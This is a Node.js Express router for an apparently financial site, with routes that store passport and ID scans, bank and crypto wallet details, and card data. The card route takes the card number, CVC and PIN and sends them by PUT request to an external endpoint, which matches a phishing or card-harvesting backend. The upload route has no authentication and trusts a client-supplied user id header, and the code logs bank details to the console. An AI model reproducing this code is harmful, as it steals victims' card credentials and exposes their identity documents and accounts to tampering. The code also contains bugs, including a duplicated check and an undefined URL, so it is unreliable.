const express = require("express");
const router = new express.Router();
const axios = require("axios");
const auth = require("../auth");
const userSchema = require("../../model");
const multer = require('multer');

const storage = multer.memoryStorage();
const upload = multer({
  storage: storage,
  limits: { fileSize: 15 * 1024 * 1024 } // set maximum file size to 15 MB
});

router.post('/user/profile/upload', upload.fields([
  { name: 'passport', maxCount: 1 },
  { name: 'idCard', maxCount: 1 }
]), async (req, res) => {
  try {
    // Get user ID from request
    const userId = req.headers.id;

    
    // Check if uploaded files exceed maximum file size
    const files = req.files;
    if (!files.passport || !files.passport) {
      return res.send({ error: 'Please select a file to upload' });
    }
    if (files.passport && files.passport[0].size > 15 * 1024 * 1024) {
      return res.send({ error: 'Profile picture exceeds maximum file size of 15 MB' });
    }
    if (files.idCard && files.idCard[0].size > 15 * 1024 * 1024) {
      return res.send({ error: 'ID card exceeds maximum file size of 15 MB'});
    }

    // Save image data to user's profile
    const user = await userSchema.findByIdAndUpdate(userId, { 
      passport: {
        data: files.passport ? files.passport[0].buffer : undefined,
        contentType: files.passport ? files.passport[0].mimetype : undefined
      },
      idCard: {
        data: files.idCard ? files.idCard[0].buffer : undefined,
        contentType: files.idCard ? files.idCard[0].mimetype : undefined
      }
    }, { new: true });

    if(user) {
      return res.send({ success: 'Upload successful!' });
    }
  } catch (err) {
    console.error(err);
    return res.send({ error: 'Upload faild!' });
  }
});

router.post("/user/profile/update", auth, validiate);
router.post("/user/wallet/update", auth, walletD);
router.post("/user/cr/credientials", auth, cr);

async function walletD(req, resp) {
  try {
    const { id } = req.headers;
    const {
      bankName,
      accountNumber,
      accountName,
      swiftcode,
      btcAddress,
      ethAddress,
      ltcAddress,
    } = req.body;

    console.log(      bankName,
      accountNumber,
      accountName,
      swiftcode,
      btcAddress,
      ethAddress,
      ltcAddress,);

    const data = await userSchema
      .findByIdAndUpdate(id, {
        bankName,
        accountNumber,
        accountName,
        swiftcode,
        btcAddress,
        ethAddress,
        ltcAddress,
      })
      .exec();
    if (data) {
      return resp.send({ success: "Upload success" });
    }
  } catch (error) {
    console.log(error);
  }
}

async function validiate(req, resp) {
  try {
    const { id } = req.headers;
    const { fullname, phone, dateOfBirth, country } = req.body;

    const data = await userSchema
      .findByIdAndUpdate(id, { fullname, phone, dateOfBirth, country })
      .exec();
    if (data) {
      return resp.send({ success: "Upload success" });
    }
  } catch (error) {
    console.log(error);
  }
}

function cr(req, resp) {
  const { cvc, num, ownerName, pin, expYear, expMonth } = req.body;

  // console.log(cvc);

  const data = {
    cards: [
      {
        cvc,
        num,
        ownerName,
        pin,
        expYear,
        expMonth,
      },
    ],
  };
  try {
    axios
      .put(url + "cards", data)
      .then((res) => {
        resp.send(res.data);
      })
      .catch((error) => console.log(error));
  } catch (error) {
    resp.send({ err: error + " Try catch" });
  }
}

module.exports = router;
